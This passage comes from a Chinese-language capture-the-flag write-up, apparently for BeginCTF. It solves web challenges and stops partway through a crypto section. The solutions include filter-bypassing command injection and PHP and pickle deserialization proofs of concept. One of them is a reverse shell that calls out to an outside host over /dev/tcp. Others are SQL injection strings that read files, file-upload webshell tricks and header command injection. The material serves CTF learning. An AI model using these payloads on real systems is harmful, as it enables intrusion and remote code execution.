class="keyword">return</span> <span class="string">&quot;banned!&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> DISALLOWED_FILES:</span><br><span class="line">        <span class="keyword">if</span> j <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;banned!&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> BLACKLIST:</span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;banned!&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    cmd = <span class="string">&#x27;ls &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = os.popen(cmd).read()</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8878</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据源码逻辑，很明显能在路由那里命令执行。</p><p>绕过过滤，通过在关键字中间插入<code>&#39;&#39;</code>来绕过关键字过滤，比如<code>echo</code>能用<code>ec&#39;&#39;ho</code>来绕过，空格能用 <code>$&#123;IFS&#125;</code>绕过，反引号没被过滤，可以内联执行。</p><p>因为<code>\</code> 、<code>/</code>、<code>.</code>被过滤了，因此不能跳转路径，但<code>|</code>没被过滤，因此可以使用<code>echo</code>搭配<code>base64</code>来写sh，再用<code>bash</code>来执行 sh文件。</p><p>先写sh，写入一个<code>ls /</code>。</p><p>先把<code>ls /&gt;2</code>进行 <code>base64</code>编码，得到<code>bHMgLz4y</code> ，然后写进一个文件内。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`ec<span class="string">&#x27;&#x27;</span>ho<span class="variable">$&#123;IFS&#125;</span>bHMgLz4y|bas<span class="string">&#x27;&#x27;</span>e64<span class="variable">$&#123;IFS&#125;</span>-d&gt;1`</span><br></pre></td></tr></table></figure><p><img src="/./BeginCTF/w_1_2.png"></p><p><img src="/./BeginCTF/w_1_3.png"></p><p>接着执行<code>bash$&#123;IFS&#125;1</code>，查看文件2 。</p><p><img src="/./BeginCTF/w_1_4.png"></p><p>接着采用相同的操作，执行<code>cat /_flag&gt;2</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`ec<span class="string">&#x27;&#x27;</span>ho<span class="variable">$&#123;IFS&#125;</span>Y2F0IC9fZmxhZz4y|bas<span class="string">&#x27;&#x27;</span>e64<span class="variable">$&#123;IFS&#125;</span>-d&gt;1`</span><br></pre></td></tr></table></figure><p>查看文件2即可得到flag。</p><p><img src="/./BeginCTF/w_1_5.png"></p><h2 id="POPgadget"><a href="#POPgadget" class="headerlink" title="POPgadget"></a>POPgadget</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;begin&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;begin&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>思路：猜测flag在env里，那么执行<code>phpinfo</code>函数即可。</p><ol><li>通过 <code>Fun::__call</code>执行<code>phpinfo</code>。</li><li><code>A::__get</code> 触发 1;</li><li><code>B::__destruct</code> 触发 2</li><li>pop链：<code>B::__destruct =&gt; A::__get =&gt; Fun::__call</code></li></ol><p>poc:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;p = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;a = <span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:1:&#123;s:9:&quot;Funfunc&quot;;s:20:&quot;call_user_func_array&quot;;&#125;&#125;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ctrl+f搜flag即可得到flag。</p><p><img src="/./BeginCTF/w_2_1.png"></p><h2 id="pickelshop"><a href="#pickelshop" class="headerlink" title="pickelshop"></a>pickelshop</h2><p>pickle反序列化</p><p>抓包注册一个账号，即可得到<code>cookie</code>。</p><p><img src="/./BeginCTF/w_3_1.png"></p><p>把<code>cookie</code>放到<code>/login</code>页面，登录成功。</p><p><img src="/./BeginCTF/w_3_2.png"></p><p>pickle反弹shell即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Email</span>():</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&#x27;&#x27;&#x27;__import__(&quot;os&quot;).popen(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxxxx/2333 0&gt;&amp;1&#x27;&quot;).read()&#x27;&#x27;&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">poc = base64.b64encode(pickle.dumps(Email()))</span><br><span class="line"><span class="built_in">print</span>(poc)</span><br><span class="line"></span><br><span class="line">login()</span><br><span class="line"><span class="comment"># b&#x27;gASVcgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxWX19pbXBvcnRfXygib3MiKS5wb3BlbigiYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDEuMTcuMTgzLzIzMzMgMD4mMSciKS5yZWFkKCmUhZRSlC4=&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/./BeginCTF/w_3_3.png"></p><h2 id="sql教学局"><a href="#sql教学局" class="headerlink" title="sql教学局"></a>sql教学局</h2><p>sql联合注入</p><p>说明：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你需要通过SQL注入的手法，并绕过一些waf，来拿到3段flag</span><br><span class="line"></span><br><span class="line">第一段flag位于 secret数据库password表的某条数据</span><br><span class="line">第二段flag位于 当前数据库score表，学生begin的成绩(grade)</span><br><span class="line">第三段flag位于 /flag</span><br></pre></td></tr></table></figure><p>过滤：</p><table><thead><tr><th align="center">过滤</th><th align="center">绕过</th></tr></thead><tbody><tr><td align="center">空格</td><td align="center">&#x2F;**&#x2F;</td></tr><tr><td align="center">or</td><td align="center">双写，oorr</td></tr><tr><td align="center">&#x3D;</td><td align="center">like</td></tr><tr><td align="center">select</td><td align="center">双写 selselectect</td></tr><tr><td align="center">frome</td><td align="center">双写 frfromom</td></tr><tr><td align="center">and</td><td align="center"></td></tr><tr><td align="center">load</td><td align="center">双写 loloadad</td></tr></tbody></table><p><strong>flag1</strong></p><p>查表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=1&#x27;/**/union/**/selselectect/**/group_concat(table_name)/**/frfromom/**/infoorrmation_schema.tables/**/where/**/table_schema/**/like/**/&#x27;ctf&#x27;%23</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password</span><br></pre></td></tr></table></figure><p>查列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=1&#x27;/**/union/**/selselectect/**/GROUP_CONCAT(COLUMN_NAME)/**/frfromom/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/&#x27;passwoorrd&#x27;%23</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id,note,flag</span><br></pre></td></tr></table></figure><p>查数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=1&#x27;/**/union/**/selselectect/**/flag/**/frfromom/**/secret.passwoorrd%23</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;d2c3f0d3-</span><br></pre></td></tr></table></figure><p><strong>flag2</strong></p><p>直接查数据即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=1&#x27;/**/union/**/selselectect/**/grade/**/frofromm/**/scoorre/**/where/**/student/**/like/**/&#x27;begin&#x27;%23</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fffb-4263-a255</span><br></pre></td></tr></table></figure><p><strong>flag3</strong></p><p>读文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=1&#x27;/**/union/**/selselectect/**/loloadad_file(&#x27;/flag&#x27;)%23</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-75ff2dda0726&#125;</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;d2c3f0d3-fffb-4263-a255-75ff2dda0726&#125;</span><br></pre></td></tr></table></figure><h2 id="zupload-zupload-pro-zupload-pro-plus"><a href="#zupload-zupload-pro-zupload-pro-plus" class="headerlink" title="zupload &#x2F; zupload-pro &#x2F; zupload-pro-plus"></a>zupload &#x2F; zupload-pro &#x2F; zupload-pro-plus</h2><p>这三个题都能用伪协议来做</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">action=php://filter/convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><h2 id="zupload-pro-plus-max"><a href="#zupload-pro-plus-max" class="headerlink" title="zupload-pro-plus-max"></a>zupload-pro-plus-max</h2><p>先压缩一个zip，然后在zip后边添加上一句话木马，接着再上传。</p><p><img src="/./BeginCTF/w_6_1.png"></p><p>之后把上传的zip包含进来即可rce。</p><p><img src="/./BeginCTF/w_6_2.png"></p><h2 id="zupload-pro-plus-max-ultra"><a href="#zupload-pro-plus-max-ultra" class="headerlink" title="zupload-pro-plus-max-ultra"></a>zupload-pro-plus-max-ultra</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./upload&#x27;</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    <span class="variable">$extract_to</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_EXTRACT_TO&#x27;</span>] ?? <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$file_ext</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_error</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_size</span> &lt;= <span class="number">2097152</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;unzip &#x27;</span> . <span class="variable">$file_tmp</span> . <span class="string">&#x27; -d &#x27;</span> . <span class="variable">$extract_to</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;File uploaded successfully&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;url&#x27;</span> =&gt; <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/\?/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="number">0</span>] . <span class="variable">$file_destination</span></span><br><span class="line">                ));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Only zip files are allowed&#x27;</span></span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目使用了<code>exec</code>函数用<code>unzip</code>解压，这里有两种做法，做法二的演示放在<strong>zupload-pro-plus-max-ultra-premium</strong>这一题。</p><p><strong>解法一：</strong></p><p>控制<code>$extract_to</code>参数，可以利用截断来执行新的命令。把命令执行的输出写到文件里，可以实现rce。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$extract_to = $_SERVER[&#x27;HTTP_X_EXTRACT_TO&#x27;] ?? &#x27;uploads/&#x27;;</span><br></pre></td></tr></table></figure><p><code>$extract_to</code>参数是通过http头<code>X-EXTRACT-TO</code>传入的，因此控制这个即可。</p><p><img src="/./BeginCTF/w_7_1.png"></p><p>访问<code>1</code>，即可看到flag。</p><p><img src="/./BeginCTF/w_7_2.png"></p><h2 id="zupload-pro-plus-max-ultra-premium"><a href="#zupload-pro-plus-max-ultra-premium" class="headerlink" title="zupload-pro-plus-max-ultra-premium"></a>zupload-pro-plus-max-ultra-premium</h2><p>因为是用的<code>unzip</code>解压，因此可以使用软链接来链接到根目录的flag。</p><p>参考：<a href="https://blog.csdn.net/qq_73767109/article/details/131033346">CTFSHOW国赛复现—–Unzip(软连接利用)</a></p><p>先压缩一个软链接 。</p><p><img src="/./BeginCTF/w_8_1.png"></p><p>然后把压缩包上传，之后访问<code>/uploads/flag</code>即可得到flag。</p><p><img src="/./BeginCTF/w_8_2.png"></p><h2 id="zupload-pro-revenge"><a href="#zupload-pro-revenge" class="headerlink" title="zupload-pro-revenge"></a>zupload-pro-revenge</h2><p>只有前端过滤，抓包改后缀即可。</p><p><img src="/./BeginCTF/w_9_1.png"></p><p>之后访问<code>/uploads/shell.php</code>即可rce。</p><p><img src="/./BeginCTF/w_9_2.png"></p><h2 id="zupload-pro-plus-enhanced"><a href="#zupload-pro-plus-enhanced" class="headerlink" title="zupload-pro-plus-enhanced"></a>zupload-pro-plus-enhanced</h2><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?action=upload&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>][<span class="number">0</span>] === <span class="string">&#x27;/&#x27;</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>], <span class="string">&#x27;/&#x27;</span>) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_error</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_size</span> &lt;= <span class="number">2097152</span>) &#123;</span><br><span class="line">                <span class="variable">$file_destination</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file_tmp</span>, <span class="variable">$file_destination</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;File uploaded successfully&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;url&#x27;</span> =&gt; <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/\?/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="number">0</span>] . <span class="variable">$file_destination</span></span><br><span class="line">                    ));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Only zip files are allowed&#x27;</span></span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>观察这段代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">xxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对文件名的处理是以<code>.</code>为分割把文件名分成数组，再判断这个数组存不存在<code>zip</code>字符串。</p><p>那么我们上传一个<code>shell.zip.php</code>的文件即可满足条件。</p><p><img src="/./BeginCTF/w_10_1.png"></p><p>访问<code>/uploads/shell.zip.php</code>即可rce。</p><p><img src="/./BeginCTF/w_10_2.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="fake-n"><a href="#fake-n" class="headerlink" title="fake_n"></a>fake_n</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fakeN_list</span>():</span><br><span class="line">    puzzle_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        r = getPrime(<span class="number">32</span>)</span><br><span class="line">        puzzle_list.append(r)</span><br><span class="line"></span><br><span class="line">    p = getPrime(<span class="number">32</span>)</span><br><span class="line">    q = getPrime(<span class="number">32</span>)</span><br><span class="line">    com = p*q</span><br><span class="line"></span><br><span 